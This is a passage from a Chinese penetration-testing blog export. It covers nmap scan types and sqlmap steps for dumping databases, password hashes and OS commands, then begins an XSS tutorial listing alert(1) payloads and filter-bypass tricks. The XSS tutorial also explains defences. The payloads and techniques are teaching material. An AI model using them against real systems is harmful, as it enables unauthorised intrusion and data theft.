class="line">Initiating NSE at <span class="number">19</span>:<span class="number">46</span></span><br><span class="line">Completed NSE at <span class="number">19</span>:<span class="number">46</span>, <span class="number">0.00</span>s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> <span class="function">IP <span class="title">address</span> <span class="params">(<span class="number">1</span> host up)</span> scanned in 294.20 seconds</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>有些要是扫描到端口，我们可以直接加上端口进行访问：<a href="http://www.xxx.com:88/">www.xxx.com:88</a></p><p><code>2、 目录结构</code></p><p>不严谨的情况下，<a href="http://www.xxx.com/old%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AF%9D%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AAold%EF%BC%88%E5%90%8D%E5%AD%97%E6%98%AF%E8%87%AA%E5%8F%96%E7%9A%84%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E5%85%B6%E4%BB%96%E7%9A%84%E5%90%8D%E5%AD%97%E5%A6%82bbs%E3%80%81news%E7%AD%89%E7%AD%89%EF%BC%8C%E5%B1%9E%E4%BA%8E%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98%EF%BC%89%E7%9B%AE%E5%BD%95%E3%80%82%E5%9B%A0%E4%B8%BA%E5%8F%AF%E8%83%BD%E7%BD%91%E7%AB%99%E4%B8%8A%E9%9D%A2%EF%BC%8C%E7%9B%AE%E5%BD%95%E4%B8%8B%E9%9D%A2%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F">www.xxx.com/old，这样的话得到一个old（名字是自取的，可能是其他的名字如bbs、news等等，属于逻辑问题）目录。因为可能网站上面，目录下面就是一个程序</a></p><p><code>3、web域名</code></p><p><code>4.中间件平台</code></p><p>apache、nginx等等，使用扫描工具+搜索引擎</p><p><code>5.第三方软件漏洞</code></p><p>ping 域名 =》得到地址，  比如一个第三方软件在端口8080下可以打开</p><p><code>6.服务器系统漏洞</code></p><p>使用一些工具如nessus</p><p><code>7.app转web及服务</code></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727090732358.png" alt="image-20200727090732358"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727090923406.png" alt="image-20200727090923406"></p><h2 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h2><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727091311056.png" alt="image-20200727091311056"></p><h3 id="Connect扫描"><a href="#Connect扫描" class="headerlink" title="Connect扫描"></a>Connect扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727092116431.png" alt="image-20200727092116431"></p><h3 id="syn扫描"><a href="#syn扫描" class="headerlink" title="syn扫描"></a>syn扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727092259122.png" alt="image-20200727092259122"></p><h3 id="ack扫描"><a href="#ack扫描" class="headerlink" title="ack扫描"></a>ack扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727092410522.png" alt="image-20200727092410522"></p><h3 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727092817010.png" alt="image-20200727092817010"></p><h3 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727092944070.png" alt="image-20200727092944070"></p><h3 id="Xmax扫描"><a href="#Xmax扫描" class="headerlink" title="Xmax扫描"></a>Xmax扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727093123604.png" alt="image-20200727093123604"></p><h3 id="window扫描"><a href="#window扫描" class="headerlink" title="window扫描"></a>window扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727093335413.png" alt="image-20200727093335413"></p><h3 id="maimon扫描"><a href="#maimon扫描" class="headerlink" title="maimon扫描"></a>maimon扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727093435291.png" alt="image-20200727093435291"></p><h3 id="idle扫描"><a href="#idle扫描" class="headerlink" title="idle扫描"></a>idle扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727093625514.png" alt="image-20200727093625514"></p><p><code>原理</code></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727094910061.png" alt="image-20200727094910061"></p><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727101530105.png" alt="image-20200727101530105"></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727102014835.png" alt="image-20200727102014835"></p><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727103142218.png" alt="image-20200727103142218"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727103340363.png" alt="image-20200727103340363"></p><h4 id="服务侦测"><a href="#服务侦测" class="headerlink" title="服务侦测"></a>服务侦测</h4><p>-sV: Probe open ports to determine service/version info</p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727104834719.png" alt="image-20200727104834719"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727105838966.png" alt="image-20200727105838966"></p><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>如何判断linux和windows系统：ping ip；如果ttl是128（或者是大于100）是windows，若是64（64上下浮动）则是linux系统</p><p>0.0.0.0表示默认路由</p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="1、判断注入点"><a href="#1、判断注入点" class="headerlink" title="1、判断注入点"></a>1、判断注入点</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727133830283.png" alt="image-20200727133830283"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134054646.png" alt="image-20200727134054646"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134416605.png" alt="image-20200727134416605"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134431389.png" alt="image-20200727134431389"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r REQUESTFILE      从文件中读取 HTTP 请求</span><br></pre></td></tr></table></figure><h3 id="2、查询当前用户下的所有数据库"><a href="#2、查询当前用户下的所有数据库" class="headerlink" title="2、查询当前用户下的所有数据库"></a>2、查询当前用户下的所有数据库</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134714615.png" alt="image-20200727134714615"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134744361.png" alt="image-20200727134744361"></p><h3 id="3-获取数据库中的表名"><a href="#3-获取数据库中的表名" class="headerlink" title="3 获取数据库中的表名"></a>3 获取数据库中的表名</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134816020.png" alt="image-20200727134816020"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134901874.png" alt="image-20200727134901874"></p><h3 id="4获取表名的字段名"><a href="#4获取表名的字段名" class="headerlink" title="4获取表名的字段名"></a>4获取表名的字段名</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727134932932.png" alt="image-20200727134932932"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135029439.png" alt="image-20200727135029439"></p><h3 id="5-获取字段名称"><a href="#5-获取字段名称" class="headerlink" title="5 获取字段名称"></a>5 获取字段名称</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135123695.png" alt="image-20200727135123695"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135240775.png" alt="image-20200727135240775"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135352446.png" alt="image-20200727135352446"></p><h3 id="6、获取数据库中的所有用户"><a href="#6、获取数据库中的所有用户" class="headerlink" title="6、获取数据库中的所有用户"></a>6、获取数据库中的所有用户</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135318018.png" alt="image-20200727135318018"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135421147.png" alt="image-20200727135421147"></p><h3 id="7、获取数据库用户密码"><a href="#7、获取数据库用户密码" class="headerlink" title="7、获取数据库用户密码"></a>7、获取数据库用户密码</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135458271.png" alt="image-20200727135458271"></p><p>如果后面加上  <code>  --batch             从不询问用户输入，使用默认配置</code>,就不会让你每次提示的时候选择</p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135706700.png" alt="image-20200727135706700"><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135814605.png" alt="image-20200727135814605"></p><h3 id="8、获取当前网站的数据库名称"><a href="#8、获取当前网站的数据库名称" class="headerlink" title="8、获取当前网站的数据库名称"></a>8、获取当前网站的数据库名称</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135752177.png" alt="image-20200727135752177"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135845917.png" alt="image-20200727135845917"></p><h3 id="9、获取当前网站数据库的用户名称"><a href="#9、获取当前网站数据库的用户名称" class="headerlink" title="9、获取当前网站数据库的用户名称"></a>9、获取当前网站数据库的用户名称</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135919593.png" alt="image-20200727135919593"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727135949317.png" alt="image-20200727135949317"></p><h3 id="10、-level-5-用户等级"><a href="#10、-level-5-用户等级" class="headerlink" title="10、-level 5 用户等级"></a>10、-level 5 用户等级</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL       设置测试等级（<span class="number">1</span><span class="number">-5</span>，默认为 <span class="number">1</span>）</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727140150437.png" alt="image-20200727140150437"></p><h3 id="11、当前用户是否有管理员权限"><a href="#11、当前用户是否有管理员权限" class="headerlink" title="11、当前用户是否有管理员权限"></a>11、当前用户是否有管理员权限</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141048128.png" alt="image-20200727141048128"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141149070.png" alt="image-20200727141149070"></p><h3 id="12、列出数据库管理员的角色"><a href="#12、列出数据库管理员的角色" class="headerlink" title="12、列出数据库管理员的角色"></a>12、列出数据库管理员的角色</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141415456.png" alt="image-20200727141415456"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141450077.png" alt="image-20200727141450077"></p><h3 id="13-HTTP-referer头"><a href="#13-HTTP-referer头" class="headerlink" title="13 HTTP referer头"></a>13 HTTP referer头</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141511930.png" alt="image-20200727141511930"></p><h3 id="14-运行自定义的sql语句"><a href="#14-运行自定义的sql语句" class="headerlink" title="14 运行自定义的sql语句"></a>14 运行自定义的sql语句</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141605782.png" alt="image-20200727141605782"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141746091.png" alt="image-20200727141746091"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141759373.png" alt="image-20200727141759373"><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141810679.png" alt="image-20200727141810679"></p><h3 id="15、运行任意操作系统命令"><a href="#15、运行任意操作系统命令" class="headerlink" title="15、运行任意操作系统命令"></a>15、运行任意操作系统命令</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727141849853.png" alt="image-20200727141849853"></p><h3 id="16、从数据库服务器中读取文件"><a href="#16、从数据库服务器中读取文件" class="headerlink" title="16、从数据库服务器中读取文件"></a>16、从数据库服务器中读取文件</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142033608.png" alt="image-20200727142033608"></p><h3 id="17、上传文件到数据库服务器中"><a href="#17、上传文件到数据库服务器中" class="headerlink" title="17、上传文件到数据库服务器中"></a>17、上传文件到数据库服务器中</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142042080.png" alt="image-20200727142042080"></p><h2 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h2><h3 id="1、扫描多个地址"><a href="#1、扫描多个地址" class="headerlink" title="1、扫描多个地址"></a>1、扫描多个地址</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142429324.png" alt="image-20200727142429324"></p><h3 id="2、扫描一个网段的"><a href="#2、扫描一个网段的" class="headerlink" title="2、扫描一个网段的"></a>2、扫描一个网段的</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142531545.png" alt="image-20200727142531545"></p><h3 id="3、扫描主机列表中所有的目标地址"><a href="#3、扫描主机列表中所有的目标地址" class="headerlink" title="3、扫描主机列表中所有的目标地址"></a>3、扫描主机列表中所有的目标地址</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142600280.png" alt="image-20200727142600280"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142710105.png" alt="image-20200727142710105"></p><h3 id="4、扫描除某一个地址之外的所有目标地址"><a href="#4、扫描除某一个地址之外的所有目标地址" class="headerlink" title="4、扫描除某一个地址之外的所有目标地址"></a>4、扫描除某一个地址之外的所有目标地址</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142741179.png" alt="image-20200727142741179"></p><h3 id="5、扫描除某一文件中的目标地址之外的目标地址"><a href="#5、扫描除某一文件中的目标地址之外的目标地址" class="headerlink" title="5、扫描除某一文件中的目标地址之外的目标地址"></a>5、扫描除某一文件中的目标地址之外的目标地址</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727142949773.png" alt="image-20200727142949773"></p><h3 id="6、端口号"><a href="#6、端口号" class="headerlink" title="6、端口号"></a>6、端口号</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143046968.png" alt="image-20200727143046968"></p><h3 id="7、路由跟踪"><a href="#7、路由跟踪" class="headerlink" title="7、路由跟踪"></a>7、路由跟踪</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143059145.png" alt="image-20200727143059145"></p><h3 id="8、c段扫描"><a href="#8、c段扫描" class="headerlink" title="8、c段扫描"></a>8、c段扫描</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143405495.png" alt="image-20200727143405495"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143235298.png" alt="image-20200727143235298"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143243603.png" alt="image-20200727143243603"></p><h3 id="9、操作系统指纹识别"><a href="#9、操作系统指纹识别" class="headerlink" title="9、操作系统指纹识别"></a>9、操作系统指纹识别</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143427918.png" alt="image-20200727143427918"></p><h3 id="10、服务器版本检测"><a href="#10、服务器版本检测" class="headerlink" title="10、服务器版本检测"></a>10、服务器版本检测</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143524603.png" alt="image-20200727143524603"></p><h3 id="11、防火墙探测"><a href="#11、防火墙探测" class="headerlink" title="11、防火墙探测"></a>11、防火墙探测</h3><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143552624.png" alt="image-20200727143552624"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727143730178.png" alt="image-20200727143730178"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200727144106405.png" alt="image-20200727144106405"></p><p><img src="/2020/07/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20190629222722846.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习</title>
      <link href="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS（跨站脚本）概述"><a href="#XSS（跨站脚本）概述" class="headerlink" title="XSS（跨站脚本）概述"></a>XSS（跨站脚本）概述</h1><a id="more"></a><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：</p><ul><li>1.反射性XSS;</li><li>2.存储型XSS;</li><li>3.DOM型XSS;</li></ul><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</p><ul><li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</li><li>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</li></ul><p>#WEB安全——XSS命令总结</p><h2 id="一：正常构造方式："><a href="#一：正常构造方式：" class="headerlink" title="一：正常构造方式："></a>一：正常构造方式：</h2><p>1、无过滤，直接写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">、&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2、正常截断：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#x27;&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、不用&lt;&gt;尖括号：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1) 空格</span><br><span class="line">&#x27; onmouseover=alert(1) 空格</span><br><span class="line">&#x27; onclick=alert(1) 空格</span><br><span class="line">&quot; onfocus=alert(1) autofocus=&quot;</span><br></pre></td></tr></table></figure><p>4、内联框架注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5、超链接注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>漏洞<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>6、alert(1)中的小括号：可用<strong>反单引号</strong>替代：**`<strong>；也可以用</strong>/**</p><p>7、当**()<strong>与</strong>反单引号**被过滤时，可使用如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;parent.alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&lt;/script&gt;&quot;</span></span></span><br><span class="line">- 